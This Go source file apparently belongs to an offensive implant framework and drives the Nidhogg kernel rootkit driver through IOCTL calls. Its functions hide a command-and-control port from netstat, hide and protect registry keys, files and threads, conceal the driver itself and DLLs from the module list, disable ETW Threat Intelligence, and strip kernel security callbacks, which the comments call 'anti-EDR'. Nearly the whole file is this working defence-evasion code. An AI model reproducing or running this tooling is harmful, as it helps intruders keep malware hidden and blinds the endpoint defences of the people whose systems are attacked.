package ttp

// nidhogg_stealth.go -- Stealth domain TTPs via Nidhogg kernel driver
//
// TTP 63: hide/protect registry key or value (IOCTL_PROTECT_HIDE_REGITEM)
// TTP 64: hide/protect thread (IOCTL_HIDE_UNHIDE_THREAD / PROTECT_UNPROTECT_THREAD)
// TTP 65: hide port from netstat/TCPView (IOCTL_HIDE_UNHIDE_PORT)
// TTP 66: protect file from deletion (IOCTL_PROTECT_UNPROTECT_FILE)
// TTP 67: disable ETW-TI via kernel (IOCTL_ENABLE_DISABLE_ETWTI)
// TTP 68: remove kernel security callback (IOCTL_REMOVE_RESTORE_CALLBACK)
//
// All return ErrNidhoggNotAvailable if driver not loaded.

import (
	"encoding/binary"
	"fmt"
	"os"
	"strconv"
	"strings"
)

// ---- IoctlHiddenPort layout ----
// bool Hide     (1 byte, offset 0)
// bool Remote   (1 byte, offset 1)
// [2 bytes padding before PortType enum]
// PortType Type (4 bytes uint32, offset 4)
// unsigned short Port (2 bytes, offset 8)
// [2 bytes trailing padding]
// Total: 12 bytes
func makeHiddenPort(port uint16, portType uint32, hide, remote bool) []byte {
	buf := make([]byte, 12)
	if hide {
		buf[0] = 1
	}
	if remote {
		buf[1] = 1
	}
	// 2 bytes padding at offset 2-3
	binary.LittleEndian.PutUint32(buf[4:], portType)
	binary.LittleEndian.PutUint16(buf[8:], port)
	return buf
}

// NidhoggHidePort hides a local or remote port from netstat/TCPView.
// params: "port/tcp" | "port/udp" | "port/tcp/remote" | "port/udp/remote"
// Example: "9443/tcp" hides local TCP port 9443 (C2 port)
func NidhoggHidePort(params string) (string, error) {
	parts := strings.Split(strings.TrimSpace(params), "/")
	if len(parts) < 2 {
		return "", fmt.Errorf("params: port/tcp|udp[/remote]")
	}
	portN, err := strconv.ParseUint(parts[0], 10, 16)
	if err != nil {
		return "", fmt.Errorf("invalid port: %s", parts[0])
	}
	var pt uint32
	switch strings.ToLower(parts[1]) {
	case "tcp":
		pt = portTypeTCP
	case "udp":
		pt = portTypeUDP
	case "all":
		pt = portTypeAll
	default:
		return "", fmt.Errorf("invalid proto: %s (use tcp/udp/all)", parts[1])
	}
	remote := len(parts) >= 3 && strings.ToLower(parts[2]) == "remote"

	in := makeHiddenPort(uint16(portN), pt, true, remote)
	if _, err := ioctl(ioctlHideUnhidePort, in, nil); err != nil {
		return "", err
	}
	dir := "local"
	if remote {
		dir = "remote"
	}
	return fmt.Sprintf("[nidhogg:net] %s port %d/%s hidden", dir, portN, parts[1]), nil
}

// ---- IoctlRegItem layout ----
// RegItemType Type (4 bytes uint32, offset 0)
// WCHAR KeyPath[255] (510 bytes, offset 4)
// WCHAR ValueName[260] (520 bytes, offset 514)
// Total: 1034 bytes
func makeRegItem(regType uint32, keyPath, valueName string) []byte {
	buf := make([]byte, 1034)
	binary.LittleEndian.PutUint32(buf[0:], regType)
	// KeyPath (255 WCHARs max, NUL-terminated)
	keyUTF16 := utf16Buf(keyPath, 255)
	copy(buf[4:], keyUTF16)
	// ValueName (260 WCHARs max, NUL-terminated)
	valUTF16 := utf16Buf(valueName, 260)
	copy(buf[514:], valUTF16)
	return buf
}

// NidhoggHideRegItem hides a registry key or value.
// params: "keypath" (hides key) | "keypath:valuename" (hides value)
// Example: "HKLM\Software\Microsoft\Windows NT\CurrentVersion\bat-svc"
func NidhoggHideRegItem(params string) (string, error) {
	var keyPath, valueName string
	if idx := strings.LastIndex(params, ":"); idx > 0 {
		keyPath = params[:idx]
		valueName = params[idx+1:]
	} else {
		keyPath = params
	}

	var regType uint32
	if valueName != "" {
		regType = regItemHiddenValue
	} else {
		regType = regItemHiddenKey
	}

	in := makeRegItem(regType, keyPath, valueName)
	if _, err := ioctl(ioctlProtectHideRegItem, in, nil); err != nil {
		return "", err
	}
	if valueName != "" {
		return fmt.Sprintf("[nidhogg:reg] value %s\\%s hidden", keyPath, valueName), nil
	}
	return fmt.Sprintf("[nidhogg:reg] key %s hidden", keyPath), nil
}

// NidhoggProtectRegItem protects a registry key or value from deletion/modification.
// params: same as NidhoggHideRegItem
func NidhoggProtectRegItem(params string) (string, error) {
	var keyPath, valueName string
	if idx := strings.LastIndex(params, ":"); idx > 0 {
		keyPath = params[:idx]
		valueName = params[idx+1:]
	} else {
		keyPath = params
	}

	var regType uint32
	if valueName != "" {
		regType = regItemProtectedValue
	} else {
		regType = regItemProtectedKey
	}

	in := makeRegItem(regType, keyPath, valueName)
	if _, err := ioctl(ioctlProtectHideRegItem, in, nil); err != nil {
		return "", err
	}
	return fmt.Sprintf("[nidhogg:reg] %s protected from deletion", params), nil
}

// ---- IoctlThreadEntry layout ----
// unsigned long Tid  (4 bytes, offset 0)
// bool Protect       (1 byte,  offset 4)
// [3 bytes padding]
// Total: 8 bytes
func makeThreadEntry(tid uint32, flag bool) []byte {
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint32(buf[0:], tid)
	if flag {
		buf[4] = 1
	}
	return buf
}

func currentTID() uint32 {
	// GetCurrentThreadId via kernel32
	proc := kernel32.NewProc("GetCurrentThreadId")
	r1, _, _ := proc.Call()
	return uint32(r1)
}

func parseTIDParam(params string) (uint32, bool, error) {
	s := strings.TrimSpace(params)
	if s == "" || s == "self" {
		return currentTID(), false, nil
	}
	negate := false
	if idx := strings.LastIndex(s, ":"); idx >= 0 {
		suffix := s[idx+1:]
		if suffix == "unhide" || suffix == "unprotect" {
			negate = true
		}
		s = s[:idx]
	}
	n, err := strconv.ParseUint(s, 10, 32)
	if err != nil {
		return 0, false, fmt.Errorf("invalid tid %q", s)
	}
	return uint32(n), negate, nil
}

// NidhoggHideThread hides a thread from debuggers and thread enumeration.
// params: "tid" | "self" | "tid:unhide"
func NidhoggHideThread(params string) (string, error) {
	tid, unhide, err := parseTIDParam(params)
	if err != nil {
		return "", err
	}
	in := makeThreadEntry(tid, !unhide)
	if _, err := ioctl(ioctlHideUnhideThread, in, nil); err != nil {
		return "", err
	}
	if unhide {
		return fmt.Sprintf("[nidhogg:thread] tid %d unhidden", tid), nil
	}
	return fmt.Sprintf("[nidhogg:thread] tid %d hidden", tid), nil
}

// NidhoggProtectThread protects a thread from termination.
// params: "tid" | "self" | "tid:unprotect"
func NidhoggProtectThread(params string) (string, error) {
	tid, unprotect, err := parseTIDParam(params)
	if err != nil {
		return "", err
	}
	in := makeThreadEntry(tid, !unprotect)
	if _, err := ioctl(ioctlProtectUnprotectThread, in, nil); err != nil {
		return "", err
	}
	if unprotect {
		return fmt.Sprintf("[nidhogg:thread] tid %d unprotected", tid), nil
	}
	return fmt.Sprintf("[nidhogg:thread] tid %d protected from termination", tid), nil
}

// NidhoggProtectFile protects a file from deletion/modification.
// params: full path e.g. "C:\Windows\Temp\bat-agent.exe" | "" (self)
//
// IoctlFileItem layout (IoctlShared.h):
//   wchar_t* FilePath  (8 bytes, offset 0) -- user-mode pointer
//   bool Protect       (1 byte,  offset 8)
//   [7 bytes padding]
// Total: 16 bytes. FilePath is a user-mode pointer; kernel ProbeForRead's it.
// We use ioctlPinnedPtr to guarantee pathBytes stays alive through the syscall.
func NidhoggProtectFile(params string) (string, error) {
	path := strings.TrimSpace(params)
	if path == "" {
		exe, err := os.Executable()
		if err != nil {
			return "", fmt.Errorf("executable: %w", err)
		}
		path = exe
	}
	pathBytes := utf16Buf(path, 260)
	buf := make([]byte, 16)
	buf[8] = 1 // Protect = true
	if _, err := ioctlPinnedPtr(ioctlProtectUnprotectFile, buf, 0, pathBytes); err != nil {
		return "", err
	}
	return fmt.Sprintf("[nidhogg:file] %s protected from deletion", path), nil
}

// NidhoggUnhideRegItem unhides a registry key or value (IOCTL_UNPROTECT_UNHIDE_REGITEM).
// params: same format as NidhoggHideRegItem
func NidhoggUnhideRegItem(params string) (string, error) {
	var keyPath, valueName string
	if idx := strings.LastIndex(params, ":"); idx > 0 {
		keyPath = params[:idx]
		valueName = params[idx+1:]
	} else {
		keyPath = params
	}

	var regType uint32
	if valueName != "" {
		regType = regItemHiddenValue
	} else {
		regType = regItemHiddenKey
	}

	in := makeRegItem(regType, keyPath, valueName)
	if _, err := ioctl(ioctlUnprotectUnhideRegItem, in, nil); err != nil {
		return "", err
	}
	if valueName != "" {
		return fmt.Sprintf("[nidhogg:reg] value %s\\%s unhidden", keyPath, valueName), nil
	}
	return fmt.Sprintf("[nidhogg:reg] key %s unhidden", keyPath), nil
}

// NidhoggUnprotectRegItem removes protection from a registry key or value.
// params: same format as NidhoggProtectRegItem
func NidhoggUnprotectRegItem(params string) (string, error) {
	var keyPath, valueName string
	if idx := strings.LastIndex(params, ":"); idx > 0 {
		keyPath = params[:idx]
		valueName = params[idx+1:]
	} else {
		keyPath = params
	}

	var regType uint32
	if valueName != "" {
		regType = regItemProtectedValue
	} else {
		regType = regItemProtectedKey
	}

	in := makeRegItem(regType, keyPath, valueName)
	if _, err := ioctl(ioctlUnprotectUnhideRegItem, in, nil); err != nil {
		return "", err
	}
	return fmt.Sprintf("[nidhogg:reg] %s unprotected", params), nil
}

// NidhoggHideDriver hides (or unhides) a driver from the driver object directory.
// Primarily used to conceal Nidhogg.sys itself.
// params: "drivername" | "drivername:unhide"
//
// IoctlHiddenDriverInfo layout (IoctlShared.h):
//   WCHAR* DriverName  (8 bytes, offset 0) -- user-mode pointer
//   bool Hide          (1 byte,  offset 8)
//   [7 bytes padding]
// Total: 16 bytes. Uses ioctlPinnedPtr for pointer safety.
func NidhoggHideDriver(params string) (string, error) {
	s := strings.TrimSpace(params)
	if s == "" {
		s = "nidhogg" // default: self-conceal
	}
	hide := true
	if idx := strings.LastIndex(s, ":"); idx > 0 && s[idx+1:] == "unhide" {
		hide = false
		s = s[:idx]
	}

	nameBytes := utf16Buf(s, 256)
	buf := make([]byte, 16)
	if hide {
		buf[8] = 1 // Hide = true
	}
	if _, err := ioctlPinnedPtr(ioctlHideUnhideDriver, buf, 0, nameBytes); err != nil {
		return "", err
	}
	if !hide {
		return fmt.Sprintf("[nidhogg:driver] %s unhidden", s), nil
	}
	return fmt.Sprintf("[nidhogg:driver] %s hidden from driver list", s), nil
}

// NidhoggHideModule hides (or unhides) a DLL from the PEB module list of a process.
// params: "pid modulename.dll" | "pid modulename.dll:unhide"
//
// IoctlHiddenModuleInfo layout (IoctlShared.h):
//   bool Hide            (1 byte,  offset 0)
//   [3 bytes padding]
//   unsigned long Pid    (4 bytes, offset 4)
//   WCHAR* ModuleName    (8 bytes, offset 8) -- user-mode pointer
// Total: 16 bytes. Uses ioctlPinnedPtr for pointer safety.
func NidhoggHideModule(params string) (string, error) {
	parts := strings.Fields(strings.TrimSpace(params))
	if len(parts) < 2 {
		return "", fmt.Errorf("params: pid modulename.dll[:unhide]")
	}
	pidN, err := strconv.ParseUint(parts[0], 10, 32)
	if err != nil {
		return "", fmt.Errorf("invalid pid: %s", parts[0])
	}
	pid := uint32(pidN)

	modName := parts[1]
	hide := true
	if idx := strings.LastIndex(modName, ":"); idx > 0 && modName[idx+1:] == "unhide" {
		hide = false
		modName = modName[:idx]
	}

	nameBytes := utf16Buf(modName, 256)
	buf := make([]byte, 16)
	if hide {
		buf[0] = 1 // Hide = true
	}
	binary.LittleEndian.PutUint32(buf[4:], pid)
	// ModuleName pointer at offset 8 -- filled by ioctlPinnedPtr
	if _, err := ioctlPinnedPtr(ioctlHideRestoreModule, buf, 8, nameBytes); err != nil {
		return "", err
	}
	if !hide {
		return fmt.Sprintf("[nidhogg:module] %s (pid %d) restored in PEB", modName, pid), nil
	}
	return fmt.Sprintf("[nidhogg:module] %s hidden from PEB module list (pid %d)", modName, pid), nil
}

// NidhoggETWTIDisable disables ETW Threat Intelligence (kernel-level).
// This suppresses EDR visibility into process/thread/image-load events.
// params: "" or "disable" to disable; "enable" to re-enable.
func NidhoggETWTIDisable(params string) (string, error) {
	enable := strings.TrimSpace(params) == "enable"
	// IOCTL_ENABLE_DISABLE_ETWTI: input = bool (1 byte)
	in := make([]byte, 4)
	if enable {
		in[0] = 1
	}
	if _, err := ioctl(ioctlEnableDisableEtwTI, in, nil); err != nil {
		return "", err
	}
	if enable {
		return "[nidhogg:etw] ETW-TI re-enabled", nil
	}
	return "[nidhogg:etw] ETW-TI disabled (EDR telemetry suppressed)", nil
}

// ---- IoctlKernelCallback layout ----
// CallbackType Type         (4 bytes uint32, offset 0)
// unsigned long long CallbackAddress (8 bytes, offset 8 due to alignment)
// bool Remove               (1 byte, offset 16)
// [padding]
// Total: 24 bytes
//
// CallbackType values:
//   0=ObProcessType, 1=ObThreadType, 2=PsCreateProcessTypeEx, 3=PsCreateProcessType,
//   4=PsCreateThreadType, 5=PsCreateThreadTypeNonSystemThread, 6=PsImageLoadType, 7=CmRegistryType

func makeKernelCallback(cbType uint32, addr uint64, remove bool) []byte {
	buf := make([]byte, 24)
	binary.LittleEndian.PutUint32(buf[0:], cbType)
	// 4 bytes padding for alignment to uint64
	binary.LittleEndian.PutUint64(buf[8:], addr)
	if remove {
		buf[16] = 1
	}
	return buf
}

// NidhoggRemoveCallback removes a kernel security callback (anti-EDR).
// params: "addr/type" where type is 0-7 (CallbackType enum)
// Example: "0xFFFFF80012345678/0" removes an ObProcess callback
func NidhoggRemoveCallback(params string) (string, error) {
	parts := strings.SplitN(strings.TrimSpace(params), "/", 2)
	if len(parts) != 2 {
		return "", fmt.Errorf("params: address/callbacktype (0=ObProcess,1=ObThread,2=PsCreateProcessEx,...)")
	}
	addrStr := strings.TrimPrefix(parts[0], "0x")
	addr, err := strconv.ParseUint(addrStr, 16, 64)
	if err != nil {
		return "", fmt.Errorf("invalid address: %s", parts[0])
	}
	cbType, err := strconv.ParseUint(parts[1], 10, 32)
	if err != nil || cbType > 7 {
		return "", fmt.Errorf("invalid callback type: %s (0-7)", parts[1])
	}

	in := makeKernelCallback(uint32(cbType), addr, true)
	if _, err := ioctl(ioctlRemoveRestoreCallback, in, nil); err != nil {
		return "", err
	}
	return fmt.Sprintf("[nidhogg:aa] callback 0x%X (type=%d) removed", addr, cbType), nil
}
